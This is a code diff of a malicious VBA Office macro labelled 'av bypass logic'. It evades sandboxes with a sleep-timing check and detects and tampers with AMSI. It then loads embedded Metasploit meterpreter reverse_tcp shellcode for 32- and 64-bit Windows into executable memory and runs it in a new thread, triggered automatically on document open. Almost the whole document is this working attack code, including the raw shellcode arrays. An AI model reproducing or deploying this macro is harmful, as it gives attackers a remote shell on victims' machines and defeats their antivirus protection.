@@ -1,10 +1,9 @@
-```vb
 'av bypass logic
 ' Declare Sleep function to pause execution for sandbox detection
-Private Declare PtrSafe Function Pause Lib "KERNEL32" (ByVal milliseconds As Long) As Long
+Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
 
 ' Declare functions to enumerate and retrieve process modules
-Public Declare PtrSafe Function EnumerateModules Lib "psapi.dll" (ByVal hProcess As LongPtr, moduleHandles As LongPtr, ByVal size As LongPtr, bytesNeeded As LongPtr, ByVal filterFlag As LongPtr) As LongPtr
+Public Declare PtrSafe Function EnumProcessModulesEx Lib "psapi.dll" (ByVal hProcess As LongPtr, moduleHandles As LongPtr, ByVal size As LongPtr, bytesNeeded As LongPtr, ByVal filterFlag As LongPtr) As LongPtr
 Public Declare PtrSafe Function GetModuleName Lib "psapi.dll" Alias "GetModuleBaseNameA" (ByVal hProcess As LongPtr, ByVal hModule As LongPtr, ByVal moduleName As String, ByVal size As LongPtr) As LongPtr
 
 ' Standard functions for module and function resolution
@@ -14,8 +13,8 @@ Private Declare PtrSafe Function ModifyProtection Lib "KERNEL32" Alias "VirtualP
 Private Declare PtrSafe Sub OverwriteMemory Lib "KERNEL32" Alias "RtlFillMemory" (destination As Any, ByVal length As Long, ByVal fill As Byte)
 
 ' Functions to allocate memory and execute payload
-Private Declare PtrSafe Function LaunchThread Lib "KERNEL32" (ByVal securityAttributes As Long, ByVal stackSize As Long, ByVal startAddress As LongPtr, param As LongPtr, ByVal creationFlags As Long, threadId As Long) As LongPtr
-Private Declare PtrSafe Function AllocateMemory Lib "KERNEL32" (ByVal address As LongPtr, ByVal size As Long, ByVal allocationType As Long, ByVal protection As Long) As LongPtr
+Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal securityAttributes As Long, ByVal stackSize As Long, ByVal startAddress As LongPtr, param As LongPtr, ByVal creationFlags As Long, threadId As Long) As LongPtr
+Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal address As LongPtr, ByVal size As Long, ByVal allocationType As Long, ByVal protection As Long) As LongPtr
 
 ' Main function to execute the macro payload
 Function RunMacro()
@@ -28,7 +27,7 @@ Function RunMacro()
     ' Detect sandbox by pausing execution and comparing elapsed time
     currentTime = Time
     startTime = Date + currentTime
-    Pause (4000) ' Pause for 4 seconds
+    Sleep (4000) ' Pause for 4 seconds
     endTime = Date + Time
     elapsed = DateDiff("s", startTime, endTime)
     delta = CInt(elapsed)
@@ -59,7 +58,7 @@ Function RunMacro()
     ' Define payload based on architecture
     If is64Bit Then
         ' Shellcode payload for 64-bit architecture
-		' msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= IP LPORT= PORT EXITFUNC=thread -f vbapplication
+        ' msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= IP LPORT= PORT EXITFUNC=thread -f vbapplication
         payload = Array(252, 72, 131, 228, 240, 232, 204, 0, 0, 0, 65, 81, 65, 80, 82, 81, 86, 72, 49, 210, 101, 72, 139, 82, 96, 72, 139, 82, 24, 72, 139, 82, 32, 77, 49, 201, 72, 139, 114, 80, 72, 15, 183, 74, 74, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 72, 139, 82, 32, 65, 81, 139, 66, 60, 72, 1, 208, 102, 129, 120, 24, _
 11, 2, 15, 133, 114, 0, 0, 0, 139, 128, 136, 0, 0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 80, 68, 139, 64, 32, 73, 1, 208, 139, 72, 24, 227, 86, 72, 255, 201, 65, 139, 52, 136, 77, 49, 201, 72, 1, 214, 72, 49, 192, 65, 193, 201, 13, 172, 65, 1, 193, 56, 224, 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, _
 208, 102, 65, 139, 12, 72, 68, 139, 64, 28, 73, 1, 208, 65, 139, 4, 136, 65, 88, 65, 88, 94, 72, 1, 208, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 82, 255, 224, 88, 65, 89, 90, 72, 139, 18, 233, 75, 255, 255, 255, 93, 73, 190, 119, 115, 50, 95, 51, 50, 0, 0, 65, 86, 73, 137, 230, 72, 129, 236, 160, 1, 0, 0, 73, 137, 229, 73, _
@@ -69,7 +68,7 @@ Function RunMacro()
 255, 255, 72, 1, 195, 72, 41, 198, 72, 133, 246, 117, 180, 65, 255, 231, 88, 106, 0, 89, 187, 224, 29, 42, 10, 65, 137, 218, 255, 213)
     Else
         ' Shellcode payload for 32-bit architecture
-		' msfvenom -p windows/meterpreter/reverse_tcp LHOST= IP LPORT= PORT EXITFUNC=thread -f vbapplication
+        ' msfvenom -p windows/meterpreter/reverse_tcp LHOST= IP LPORT= PORT EXITFUNC=thread -f vbapplication
         payload = Array(252, 232, 143, 0, 0, 0, 96, 49, 210, 137, 229, 100, 139, 82, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 49, 255, 15, 183, 74, 38, 49, 192, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 73, 117, 239, 82, 87, 139, 82, 16, 139, 66, 60, 1, 208, 139, 64, 120, 133, 192, 116, 76, 1, 208, 139, 72, 24, 139, 88, 32, 80, 1, 211, 133, 201, 116, 60, 73, 49, _
 255, 139, 52, 139, 1, 214, 49, 192, 193, 207, 13, 172, 1, 199, 56, 224, 117, 244, 3, 125, 248, 59, 125, 36, 117, 224, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 88, 95, 90, 139, 18, 233, 128, 255, 255, 255, 93, 104, 51, 50, 0, 0, 104, 119, 115, 50, 95, 84, _
 104, 76, 119, 38, 7, 137, 232, 255, 208, 184, 144, 1, 0, 0, 41, 196, 84, 80, 104, 41, 128, 107, 0, 255, 213, 106, 10, 104, 192, 168, 93, 128, 104, 2, 0, 1, 187, 137, 230, 80, 80, 80, 80, 64, 80, 64, 80, 104, 234, 15, 223, 224, 255, 213, 151, 106, 16, 86, 87, 104, 153, 165, 116, 97, 255, 213, 133, 192, 116, 10, 255, 78, 8, 117, 236, 232, 103, 0, 0, 0, _
@@ -78,7 +77,7 @@ Function RunMacro()
     End If
 
     ' Allocate memory for the payload
-    allocatedAddr = AllocateMemory(0, UBound(payload), &H3000, &H40)
+    allocatedAddr = VirtualAlloc(0, UBound(payload), &H3000, &H40)
 
     ' Copy shellcode into the allocated memory
     For index = LBound(payload) To UBound(payload)
@@ -87,7 +86,7 @@ Function RunMacro()
     Next index
 
     ' Execute the shellcode by creating a new thread
-    executionResult = LaunchThread(0, 0, allocatedAddr, 0, 0, 0)
+    executionResult = CreateThread(0, 0, allocatedAddr, 0, 0, 0)
 End Function
 
 ' Function to check the architecture of the process (32-bit or 64-bit)
@@ -108,7 +107,7 @@ Function DetectAMSI(moduleFile As String, is64Bit As Boolean) As Boolean
     DetectAMSI = False            ' Default to no AMSI detection
 
     ' Enumerate all loaded modules in the current process
-    result = EnumerateModules(-1, modules(0), 1024, cbNeeded, &H3)
+    result = EnumProcessModulesEx(-1, modules(0), 1024, cbNeeded, &H3)
     moduleCount = IIf(is64Bit, cbNeeded / 8, cbNeeded / 4) ' Determine module count based on architecture
 
     ' Check each module for the AMSI module
@@ -155,4 +154,3 @@ End Sub
 Sub AutoOpen()
     AutoRun
 End Sub
-```
